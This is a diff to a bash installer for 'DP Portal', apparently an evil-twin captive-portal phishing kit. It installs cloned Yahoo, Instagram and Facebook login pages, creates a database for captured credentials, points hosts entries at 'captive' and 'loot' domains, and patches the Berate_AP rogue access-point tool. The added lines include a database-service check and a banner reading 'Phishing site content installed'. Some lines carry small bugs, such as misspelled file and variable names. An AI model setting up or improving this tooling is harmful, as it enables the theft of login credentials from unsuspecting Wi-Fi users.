@@ -23,6 +23,9 @@ _tan=$(tput setaf 3)
 _blue=$(tput setaf 38)
 
 
+dbServerName=""
+
+
 function initBlurb() {
 
 	getUserConsent
@@ -106,6 +109,27 @@ function initBlurb() {
 function generatePassword()
 {
     echo "$(openssl rand -base64 32 | tr -dc 'A-Za-z0-9' | head -c 16)"
+}
+
+
+function checkSQLRunning()
+{
+
+if systemctl is-active --quiet "$dbServerName"; then
+        echo "$dbServerName is already running."
+    else
+        echo "$dbServerName is not running. Starting it..."
+        sudo systemctl start "$dbServerName"
+
+        if systemctl is-active --quiet "$dbServerName"; then
+            echo "$dbServerName started successfully."
+        else
+            echo "Failed to start $dbServerName."
+            _error "This installation can't continue until your database server works..."
+        fi
+    fi
+
+
 }
 
 
@@ -356,25 +380,28 @@ function setHostsFile()
 {
 
 	#Check for custom domains and apply if necessary
-	if [[ -f /etc/dpportal/config/customdomain.conf ]]; then
-	
-		doesCap=$(cat /etc/dpportal/config/customdoamin.conf | grep -c "^captive")
-		if [[ $doesCap -eq 1 ]]; then
-			customCapDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^captive" | cut -d " " -f 2)
-			captiveDomain=$customCapDom
-		fi
-		
-		doesLoot=$(cat /etc/dpportal/config/customdomain.conf | grep -c "^loot")
-		if [[ $doesLoot -eq 1 ]]; then
-			customLootDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^loot" > cut -d " " -f 2)
-			lootDomain=$customLootDomain
-		fi
-		
-	else
-		captiveDomain="captive.dpportal.io"
-		lootDomain="loot.dpportal.io"
+#	if [[ -f /etc/dpportal/config/customdomain.conf ]]; then
+#	
+#		doesCap=$(cat /etc/dpportal/config/customdoamin.conf | grep -c "^captive")
+#		if [[ $doesCap -eq 1 ]]; then
+#			customCapDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^captive" | cut -d " " -f 2)
+#			captiveDomain=$customCapDom
+#		fi
+#		
+#		doesLoot=$(cat /etc/dpportal/config/customdomain.conf | grep -c "^loot")
+#		if [[ $doesLoot -eq 1 ]]; then
+#			customLootDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^loot" > cut -d " " -f 2)
+#			lootDomain=$customLootDomain
+#		fi
+#		
+#	else
+#		captiveDomain="captive.dpportal.io"
+#		lootDomain="loot.dpportal.io"
+#
+#	fi
 
-	fi
+captiveDomain="captive.dpportal.io"
+lootDomain="loot.dpportal.io"
 
     #Copy Hosts file and preserve current POSIX permissions
     cp --preserve /etc/hosts /etc/dpportal/config/dpphosts
@@ -482,7 +509,7 @@ function checkPackages()
 			_error "Looks like you wont be able to use this awesome tool then, sorry..."
 			_die "Goodbye..."
 		else
-			sudo apt install $MISSING_PACKAGES
+			sudo apt install -y $MISSING_PACKAGES >>$installLog 2>&1
 		fi
 	fi
 
@@ -491,6 +518,7 @@ function checkPackages()
 
 function checkPreReqs()
 {
+
 
 	#Check Apache installed
     apacheP=$(dpkg --get-selections | grep -c 'apache2-bin')
@@ -512,10 +540,12 @@ function checkPreReqs()
 	else 
 		echo -e "$info\nInstalling MariaDB Server...\n"
         apt update && apt install -y mariadb-server >>$installLog 2>&1
+	dbServerName="mariadb"
         sleep 3
 		if [[ $? -ne 0 ]]; then
             echo -e "$info\nCouldn't quite manage installation of MariaDB Server, now trying MySQL Server instead...\n"
             apt install mysql-server >>$installLog 2>&1
+	    dbSerberName="mysql"
             if [[ $? -eq 0 ]]; then
                 echo -e "$info\nSuccessfully installaed MySQL Server."
 			else
@@ -693,40 +723,84 @@ sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/yahoo/login.php"
 sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/instagram/login.php"
 sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/facebook/login.php"
 
+}
 
+function installSuccessful() {
+
+clear
+_printPoweredBy
+_arrow "INSTALLATION COMPLETE"
+_success "SQL Server Configured."
+_success "Depenencies met, all packages present and correct."
+_success "Database created and permissions set."
+_success "Phishing site content installed."
+_success "Web server configuration set."
+_success "Setting host specific database credentials into your site configuration."
+echo -e "..........\n\n\n\n"
+_success "DPPortal has been installed successfully!"
+_error "DON'T ABUSE THE POWER!"
+
+exit 0
 
 }
 
+
 #Run all install functions in order
 clear
-_printPoweredBy "DP Portal"
+_printPoweredBy
+_arrow "DP Portal"
 initBlurb
 sleep 1
-_printPoweredBy "Database details"
+clear
+_printPoweredBy
+_arrow "Checking SQL server"
+checkSQLRunning
+sleep 1
+clear
+_printPoweredBy
+_arrow "Database details"
 sleep 1
 setDBDetails
-_printPoweredBy "Checking for pre-req packages...."
+clear
+_printPoweredBy
+_arrow "Checking for pre-req packages...."
 sleep 1
 checkPreReqs
-_printPoweredBy "Setting admin panel credentials..."
+clear
+_printPoweredBy
+_arrow "Setting admin panel credentials..."
 sleep 1
+clear
 initAuthCreds
-_printPoweredBy "Creating the database itself"
+clear
+_printPoweredBy
+_arrow "Creating the database itself"
 sleep 1
+clear
 createDBStuff
-_printPoweredBy "Modding the hosts file..."
+clear
+_printPoweredBy
+_arrow "Modding the hosts file..."
 sleep 1
 setHostsFile
-_printPoweredBy "Installing site content..."
+clear
+_printPoweredBy
+_arrow "Installing site content..."
 sleep 1
 installContent
-_printPoweredBy "Configuring PHP"
+clear
+_printPoweredBy
+_arrow "Configuring PHP"
 sleep 1
 setDatabasePHPConfig
-_printPoweredBy "Tweaking your SQL nips..."
+clear
+_printPoweredBy
+_arrow "Tweaking your SQL nips..."
 sleep 1
 insertSQLPass
 sleep 1
-_printPoweredBy "Fixing Berate_AP's channel discrimination..."
+clear
+_printPoweredBy
+_arrow "Fixing Berate_AP's channel discrimination..."
 modFixBerate
 sleep 1
